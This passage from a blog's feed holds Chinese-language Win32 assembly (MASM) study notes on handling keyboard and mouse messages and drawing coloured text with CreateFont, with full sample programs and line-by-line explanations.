<p>绘制客户区的代码首先检测<code>MouseClick</code>标志位，再决定是否重绘。因为我们在首次显示窗口时还没有左键按下的消息，所以我们在初始时把该标志设为<code>FALSE</code>，告诉WINDOWS不要重绘客户区，当有左键按下的消息时，它会在鼠标按下的位置绘制字符串。注意在调用<code>TextOut</code>函数时，其关于字符串长度的参数是调用<code>lstrlen</code>函数来计算的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(6)：键盘输入消息</title>
    <link href="http://hacktech.cn/2018/02/08/Win32ASM6-Keyboard-input-msg.html"/>
    <id>http://hacktech.cn/2018/02/08/Win32ASM6-Keyboard-input-msg.html</id>
    <published>2018-02-08T09:53:59.000Z</published>
    <updated>2018-04-10T13:30:44.661Z</updated>
    
    <content type="html"><![CDATA[<p>这次，我们将要学习WINDOWS程序是如何处理键盘消息的。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>因为大多数的PC只有一个键盘，所以所有运行中的WINDOWS程序必须共用它。<strong>WINDOWS 将负责把击键消息送到具有输入焦点的那个应用程序中去</strong>。尽管屏幕上可能同时有几个应用程序窗口，但一个时刻仅有一个窗口有输入焦点。有输入焦点的那个应用程序的标题条总是高亮度显示的。 实际上您可以从两个角度来看键盘消息：一是您可以把它看成是一大堆的按键消息的集合，在这种情况下，当您按下一个键时，WINDOWS就会发送一个 <code>WM_KEYDOWN</code> 给有输入焦点的那个应用程序，提醒它有一个键被按下。当您释放键时，WINDOWS又会发送一个 <code>WM_KYEUP</code> 消息，告诉有一个键被释放。您把每一个键当成是一个按钮；另一种情况是：您可以把键盘看成是字符输入设备。当您按下“a”键时，WINDOWS发送一个 <code>WM_CHAR</code> 消息给有输入焦点的应用程序，告诉它“a”键被按下。实际上WINDOWS 内部发送 <code>WM_KEYDOWN</code> 和 <code>WM_KEYUP</code> 消息给有输入焦点的应用程序，而这些消息将通过调用 <code>TranslateMessage</code> 翻译成 <code>WM_CHAR</code> 消息。WINDOWS窗口过程函数将决定是否处理所收到的消息，一般说来您不大会去处理 <code>WM_KEYDOWN</code> 、 <code>WM_KEYUP</code> 消息，在消息循环中 <code>TranslateMessage</code> 函数会把上述消息转换成 <code>WM_CHAR</code> 消息。这次学习中将只处理 <code>WM_CHAR</code>。 </p>
<h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat,stdcall</div><div class="line">option casemap:none</div><div class="line"></div><div class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</div><div class="line"></div><div class="line">include windows.inc</div><div class="line">include user32.inc</div><div class="line">include kernel32.inc</div><div class="line">include gdi32.inc</div><div class="line">includelib user32.lib</div><div class="line">includelib kernel32.lib</div><div class="line">includelib gdi32.lib</div><div class="line"></div><div class="line">.data</div><div class="line">ClassName db &quot;SimpleWinClass&quot;,0</div><div class="line">AppName   db &quot;Our Fourth Window&quot;,0</div><div class="line">char WPARAM 20h</div><div class="line"></div><div class="line">.data?</div><div class="line">hInstance HINSTANCE ?</div><div class="line">CommandLine LPSTR ?</div><div class="line"></div><div class="line">.code</div><div class="line">start:</div><div class="line">invoke GetModuleHandle,NULL</div><div class="line">mov    hInstance,eax</div><div class="line">invoke GetCommandLine</div><div class="line">mov    CommandLine,eax</div><div class="line">invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT</div><div class="line">invoke ExitProcess,eax</div><div class="line"></div><div class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</div><div class="line">    </div><div class="line">    LOCAL wc:WNDCLASSEX</div><div class="line">    LOCAL msg:MSG</div><div class="line">    LOCAL hwnd:HWND</div><div class="line">    mov wc.cbSize,SIZEOF WNDCLASSEX</div><div class="line">    mov wc.style,CS_HREDRAW or CS_VREDRAW</div><div class="line">    mov wc.lpfnWndProc,OFFSET WndProc</div><div class="line">    mov wc.cbClsExtra,NULL</div><div class="line">    mov wc.cbWndExtra,NULL</div><div class="line">    push hInst</div><div class="line">    pop wc.hInstance</div><div class="line">    mov wc.hbrBackground,COLOR_WINDOW+1</div><div class="line">    mov wc.lpszMenuName,NULL</div><div class="line">    mov wc.lpszClassName,OFFSET ClassName</div><div class="line">    invoke LoadIcon,NULL,IDI_APPLICATION</div><div class="line">    mov wc.hIcon,eax</div><div class="line">    mov wc.hIconSm,eax</div><div class="line">    invoke LoadCursor,NULL,IDC_ARROW</div><div class="line">    mov wc.hCursor,eax</div><div class="line">    invoke RegisterClassEx,ADDR wc</div><div class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\</div><div class="line">                        WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,\</div><div class="line">                        CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,hInst,NULL</div><div class="line">    mov hwnd,eax</div><div class="line">    invoke ShowWindow,hwnd,SW_SHOWNORMAL</div><div class="line">    invoke UpdateWindow,hwnd</div><div class="line">    .while TRUE</div><div class="line">        invoke GetMessage,ADDR msg,NULL,0,0</div><div class="line">        .break .if (!eax)</div><div class="line">        invoke TranslateMessage,ADDR msg</div><div class="line">        invoke DispatchMessage,ADDR msg</div><div class="line">    .endw</div><div class="line">    mov eax,msg.wParam</div><div class="line">    ret</div><div class="line"></div><div class="line">WinMain endp </div><div class="line"></div><div class="line">WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM</div><div class="line">    </div><div class="line">    LOCAL hdc:HDC</div><div class="line">    LOCAL ps:PAINTSTRUCT</div><div class="line">    </div><div class="line">    .if uMsg==WM_DESTROY</div><div class="line">        invoke PostQuitMessage,NULL</div><div class="line">    .elseif uMsg==WM_CHAR</div><div class="line">        push wParam</div><div class="line">        pop  char</div><div class="line">        invoke InvalidateRect,hWnd,NULL,TRUE</div><div class="line">    .elseif uMsg==WM_PAINT</div><div class="line">        invoke BeginPaint,hWnd,ADDR ps</div><div class="line">        mov    hdc,eax</div><div class="line">        invoke TextOut,hdc,0,0,ADDR char,1</div><div class="line">        invoke EndPaint,hWnd,ADDR ps</div><div class="line">    .else</div><div class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</div><div class="line">        ret</div><div class="line">    .endif</div><div class="line">    xor eax,eax</div><div class="line">    ret</div><div class="line"></div><div class="line">WndProc endp</div><div class="line">end start</div></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">char WPARAM 20h</div></pre></td></tr></table></figure>
<p>这个变量将保存从键盘接收到的字符。因为它是在窗口过程中通过WPARAM型变量传送的，所以我们简单地把它定义为WPARAM型。<strong>由于我们的窗口在初次刷新时(也即刚被创建的那一次)是没有键盘输入的所以我们把他设成空格符（20h），这样显示时您就什么都看不见。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.ELSEIF uMsg==WM_CHAR </div><div class="line">    push wParam </div><div class="line">    pop  char </div><div class="line">    invoke InvalidateRect, hWnd,NULL,TRUE</div></pre></td></tr></table></figure>
<p>这一段是用来处理<code>WM_CHAR</code>消息的。它把接收到的字符放入变量<code>char</code>中，接着调用<code>InvalidateRect</code>，而InvalidateRect使得窗口的客户区无效，这样它会发出WM_PAINT消息，而WM_PAINT消息迫使WINDOWS重新绘制它的客户区。该函数的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">InvalidateRect proto hWnd:HWND, lpRect:DWORD, bErase:DWORD</div></pre></td></tr></table></figure>
<p><code>lpRect</code>是指向客户区我们想要其无效的一个正方形结构体的指针。如果该值等于<code>NULL</code>，则整个客户区都无效；布尔值<code>bErase</code>告诉WINDOWS是否擦除背景，如果是TRUE，则WINDOWS在调用BeginPaint函数时把背景擦掉。 所以我们此处的做法是：<strong>我们将保存所有有关重绘客户区的数据，然后发送<code>WM_PAINT</code>消息(通过<code>InvalidateRect</code>)，处理该消息的程序段然后根据相关数据重新绘制客户区。实际上我们完全可以通过调用 <code>GetDC</code> 获得设备上下文句柄，然后绘制字符，然后再调用<code>ReleaseDC</code>释放设备上下文句柄，毫无疑问这样也能在客户区绘制出正确的字符。但是如果这之后接收到<code>WM_PAINT</code>消息要处理时，客户区会重新刷新，而我们这稍前所绘制的字符就会消失掉。所以为了让字符一直正确地显示，就必须把它们放到<code>WM_PAINT</code>的处理过程中处理。而在本消息处理中发送<code>WM_PAINT</code>消息即可。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">invoke TextOut,hdc,0,0,ADDR char,1</div></pre></td></tr></table></figure>
<p><strong>在调用<code>InvalidateRect</code>时，<code>WM_PAINT</code>消息被发送到了WINDOWS窗口处理过程，程序流程转移到处理<code>WM_PAINT</code>消息的程序段</strong>，然后调用<code>BeginPaint</code>得到设备上下文的句柄，再调用<code>TextOut</code>在客户区的（0，0）处输出保存的按键字符。这样无论您按什么键都能在客户区的左上角显示，不仅如此，无论您怎么缩放窗口（迫使WINDOWS重新绘制它的客户区），字符都会在正确的地方显示，所以<strong>必须把所有重要的绘制动作都放到处理<code>WM_PAINT</code>消息的程序段中去</strong>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次，我们将要学习WINDOWS程序是如何处理键盘消息的。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(5)：绘制文本2</title>
    <link href="http://hacktech.cn/2018/02/08/Win32-ASM-5-draw-text.html"/>
    <id>http://hacktech.cn/2018/02/08/Win32-ASM-5-draw-text.html</id>
    <published>2018-02-08T07:55:46.000Z</published>
    <updated>2018-04-10T13:29:31.234Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将学习有关文本的诸多属性如字体和颜色等。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>Windows 的颜色系统是用RGB值来表示的，R 代表红色，G 代表绿色，B 代表蓝色。如果您想指定一种颜色就必须给该颜色赋相关的 RGB 值，RGB 的取值范围都是从 0 到 255，譬如您想要得到纯红色，就必须对RGB赋值（255，0，0），纯白色是 （255，255，255）。</p>
<p>您可以用函数 <code>SetTextColor</code> 和 <code>SetBkColor</code> 来“绘制”字符颜色和背景色，但是必须传递一个“设备环境”的句柄和 RGB 值作为参数。RGB 的结构体的定义如下： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">RGB_value struct</div><div class="line">unused db 0</div><div class="line">blue db ?</div><div class="line">green db ?</div><div class="line">red db ?</div><div class="line">RGB_value ends</div></pre></td></tr></table></figure>
<p>其中第一字节为 0 而且始终为 0，其它三个字节分别表示蓝色、绿色和红色，刚好和 RGB 的次序相反。这个结构体用起来挺别扭，所以我们重新定义一个宏用它来代替。该宏接收红绿蓝三个参数，并在 eax 寄存器中返回 32 位的 RGB 值，宏的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">RGB macro red，green，blue</div><div class="line">xor eax，eax</div><div class="line">mov ah，blue</div><div class="line">shl eax，8</div><div class="line">mov ah，green</div><div class="line">mov al，red</div><div class="line">endm</div></pre></td></tr></table></figure>
<p>您可以把该宏放到头文件中以方便使用。 </p>
<p>您可以调用 <code>CreateFont</code> 和 <code>CreateFontIndirect</code> 来创建自己的字体，这两个函数的差别是：前者要求您传递一系列的参数，而后者只要传递一个指向 <code>LOGFONT</code> 结构的指针。这样就使得后者使用起来更方便，尤其当您需要频繁创建字体时。在我们的例子中由于只要创建一种字体，故用 <code>CreateFont</code> 就足够了。在调用该函数后会返回所创建的字体的句柄，然后把该句柄选进“设备环境”使其成为当前字体，随后所有的“绘制”文本串的函数在被调用时都要把该句柄作为一个参数传递 </p>
<h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat, stdcall</div><div class="line">option casemap:none</div><div class="line"></div><div class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</div><div class="line"></div><div class="line">include windows.inc</div><div class="line">include user32.inc</div><div class="line">includelib user32.lib</div><div class="line">include kernel32.inc</div><div class="line">includelib kernel32.lib</div><div class="line">include gdi32.inc</div><div class="line">includelib gdi32.lib</div><div class="line"></div><div class="line">RGB macro red,green,blue</div><div class="line">	xor eax,eax</div><div class="line">	mov ah,blue</div><div class="line">	shl eax,8</div><div class="line">	mov ah,green</div><div class="line">	mov al,red</div><div class="line">endm</div><div class="line"></div><div class="line">.data</div><div class="line">ClassName db &quot;SimpleWinClass&quot;,0</div><div class="line">AppName   db &quot;Our Third Window&quot;,0</div><div class="line">TestString db &quot;Win32 汇编非常有意思&quot;,0</div><div class="line">FontName db &quot;script&quot;,0</div><div class="line"></div><div class="line">.data?</div><div class="line">hInstance HINSTANCE ?</div><div class="line">CommandLine LPSTR ?</div><div class="line"></div><div class="line">.code</div><div class="line">start:</div><div class="line">	invoke GetModuleHandle,NULL</div><div class="line">	mov    hInstance,eax</div><div class="line">	invoke GetCommandLine</div><div class="line">	mov    CommandLine,eax</div><div class="line">	invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT</div><div class="line">	invoke ExitProcess,eax</div><div class="line"></div><div class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </div><div class="line">    LOCAL wc:WNDCLASSEX </div><div class="line">    LOCAL msg:MSG </div><div class="line">    LOCAL hwnd:HWND </div><div class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </div><div class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </div><div class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </div><div class="line">    mov   wc.cbClsExtra,NULL </div><div class="line">    mov   wc.cbWndExtra,NULL </div><div class="line">    push  hInst </div><div class="line">    pop   wc.hInstance </div><div class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </div><div class="line">    mov   wc.lpszMenuName,NULL </div><div class="line">    mov   wc.lpszClassName,OFFSET ClassName </div><div class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </div><div class="line">    mov   wc.hIcon,eax </div><div class="line">    mov   wc.hIconSm,eax </div><div class="line">    invoke LoadCursor,NULL,IDC_ARROW </div><div class="line">    mov   wc.hCursor,eax </div><div class="line">    invoke RegisterClassEx, addr wc </div><div class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </div><div class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </div><div class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </div><div class="line">           hInst,NULL </div><div class="line">    mov   hwnd,eax </div><div class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </div><div class="line">    invoke UpdateWindow, hwnd </div><div class="line">    .WHILE TRUE </div><div class="line">        invoke GetMessage, ADDR msg,NULL,0,0 </div><div class="line">        .BREAK .IF (!eax) </div><div class="line">        invoke TranslateMessage, ADDR msg </div><div class="line">        invoke DispatchMessage, ADDR msg </div><div class="line">    .ENDW </div><div class="line">    mov     eax,msg.wParam </div><div class="line">    ret </div><div class="line">WinMain endp</div><div class="line"></div><div class="line">WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM</div><div class="line">    </div><div class="line">    LOCAL hdc:HDC</div><div class="line">    LOCAL ps:PAINTSTRUCT</div><div class="line">    LOCAL hfont:HFONT</div><div class="line">    </div><div class="line">    .IF uMsg==WM_DESTROY</div><div class="line">        invoke PostQuitMessage,NULL</div><div class="line">    .ELSEIF uMsg==WM_PAINT</div><div class="line">        invoke BeginPaint,hWnd,ADDR ps</div><div class="line">        mov    hdc,eax</div><div class="line">        invoke CreateFont,24,16,0,0,400,0,0,0,OEM_CHARSET,\</div><div class="line">                            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,\</div><div class="line">                            DEFAULT_QUALITY,DEFAULT_PITCH or FF_SCRIPT,\</div><div class="line">                            ADDR FontName </div><div class="line">        invoke SelectObject,hdc,eax</div><div class="line">        mov    hfont,eax</div><div class="line">        RGB    200,200,50</div><div class="line">        invoke SetTextColor,hdc,eax</div><div class="line">        RGB    0,0,255</div><div class="line">        invoke SetBkColor,hdc,eax</div><div class="line">        invoke TextOut,hdc,0,0,ADDR TestString,SIZEOF TestString</div><div class="line">        invoke SelectObject,hdc,hfont</div><div class="line">        invoke EndPaint,hWnd,ADDR ps</div><div class="line">    .ELSE</div><div class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</div><div class="line">        ret</div><div class="line">    .endif</div><div class="line">    xor eax,eax</div><div class="line">    ret</div><div class="line">WndProc endp</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p><code>CreateFont</code> 函数产生一种逻辑字体，它尽可能地接近参数中指定的各相关值。这个函数大概是所有 Windows API 函数中所带参数最多的一个。它返回一个指向逻辑字体的句柄供调用 <code>SelectObject</code> 函数使用。下面我们详细讲解该函数的参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">CreateFont proto \</div><div class="line">nHeight：DWORD，\</div><div class="line">nWidth：DWORD，\</div><div class="line">nEscapement：DWORD，\</div><div class="line">nOrientation：DWORD，\</div><div class="line">nWeight：DWORD，\ </div><div class="line">cItalic：DWORD，\ </div><div class="line">cUnderline：DWORD，\</div><div class="line">cStrikeOut：DWORD，\</div><div class="line">cCharSet：DWORD，\</div><div class="line">cOutputPrecision：DWORD，\</div><div class="line">cClipPrecision：DWORD，\</div><div class="line">cQuality：DWORD，\</div><div class="line">cPitchAndFamily：DWORD，\</div><div class="line">lpFacename：DWORD</div></pre></td></tr></table></figure>
<ul>
<li><code>nHeight</code>： 希望使用的字体的高度，0为缺省。</li>
<li><code>nWidth</code>： 希望使用的字体的宽度，一般情况下最好用0， 这样 Windows 将会自动为您选择一个和高度匹配的值。因为在我们的例子中那样做的话会使得字符因太小而无法显示，所以我们设定它为16。</li>
<li><code>nEscapement</code>： 每一个字符相对前一个字符的旋转角度，一般设成0。900代表转90度，1800转190度，2700转270度。</li>
<li><code>nOrientation</code>： 字体的方向。</li>
<li><code>nWeight</code>： 字体笔画的粗细。</li>
</ul>
<p>Windows 为我们预定义了如下值： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">FW_DONTCARE 等于 0</div><div class="line">FW_THIN 等于 100</div><div class="line">FW_EXTRALIGHT 等于 200</div><div class="line">FW_ULTRALIGHT 等于 200</div><div class="line">FW_LIGHT 等于 300</div><div class="line">FW_NORMAL 等于 400</div><div class="line">FW_REGULAR 等于 400</div><div class="line">FW_MEDIUM 等于 500</div><div class="line">FW_SEMIBOLD 等于 600</div><div class="line">FW_DEMIBOLD 等于 600</div><div class="line">FW_BOLD 等于 700</div><div class="line">FW_EXTRABOLD 等于 800</div><div class="line">FW_ULTRABOLD 等于 800</div><div class="line">FW_HEAVY 等于 900</div><div class="line">FW_BLACK 等于 900</div></pre></td></tr></table></figure>
<ul>
<li><code>cItalic</code>： 0为正常，其它值为斜体。 </li>
<li><code>cUnderline</code>： 0为正常，其它值为有下划线。</li>
<li><code>cStrikeOut</code>： 0为正常，其它值为删除线。</li>
<li><code>cCharSet</code>： 字体的字符集。一般选择OEM_CHARSET，它使得 Windows 会选用和操作系统相关的字符集。</li>
<li><code>cOutputPrecision</code>： 指定我们选择的字体接近真实字体的精度。 一般选用OUT_DEFAULT_PRECIS，它决定了缺省的映射方式。</li>
<li><code>cClipPrecision</code>： 指定我们选择的字体在超出裁剪区域时的裁剪精度。 一般选用CLIP_DEFAULT_PRECIS，它决定了裁剪精度。</li>
<li><code>cQuality</code>： 指定输出字体的质量。它指出GDI应如何尽可能的接近真实 字体，一共有三种方式：DEFAULT_QUALITY， PROOF_QUALITY 和DRAFT_QUALITY。</li>
<li><code>cPitchAndFamily</code>：字型和字体家族。</li>
<li><code>lpFacename</code>： 指定字体的名称。 </li>
</ul>
<p>上面的描述不一定好理解，您如果要的到更多的信息，应参考 WIN32 API 指南。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">invoke SelectObject， hdc， eax</div><div class="line">mov hfont，eax</div></pre></td></tr></table></figure>
<p>在我们得到了指向逻辑字体的句柄后必须调用 <code>SelectObject</code> 函数把它选择进“设备环境”，我们还可以调用该函数把诸如此类的像颜色、笔、画刷 等GDI对象选进“设备环境”。该函数会返回一个旧的“设备环境”的句柄。您必须保存该句柄，以便在完成“绘制”工作后再把它选回。在调用 <code>SelectObject</code> 函数后一切的绘制函数都是针对该“设备环境”的。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">RGB 200，200，50</div><div class="line">invoke SetTextColor，hdc，eax</div><div class="line">RGB 0，0，255 </div><div class="line">invoke SetBkColor，hdc，eax</div></pre></td></tr></table></figure>
<p>我们用宏 RGB 产生颜色，然后分别调用 <code>SetTextColor</code> 和 <code>SetBkColor</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">invoke TextOut，hdc，0，0，ADDR TestString，SIZEOF TestString</div></pre></td></tr></table></figure>
<p>我们调用 <code>TextOut</code> 在客户区用我们前面选定的字体和颜色“绘制”文本串。 <code>TextOut,hdc,x,y,lpString,nCount</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">invoke SelectObject，hdc， hfont</div></pre></td></tr></table></figure>
<p>在我们“绘制”完成后，必须恢复“设备环境”。</p>
<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fo9dl4zzhsj20u00hk0sw.jpg" alt="绘制有颜色的文本"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将学习有关文本的诸多属性如字体和颜色等。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(4)：绘制文本</title>
    <link href="http://hacktech.cn/2018/02/07/Win32-ASM-4-draw-text.html"/>
    <id>http://hacktech.cn/2018/02/07/Win32-ASM-4-draw-text.html</id>
    <published>2018-02-07T09:11:25.000Z</published>
    <updated>2018-04-10T13:28:11.076Z</updated>
    
    <content type="html"><![CDATA[<p>这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。<br><a id="more"></a></p>
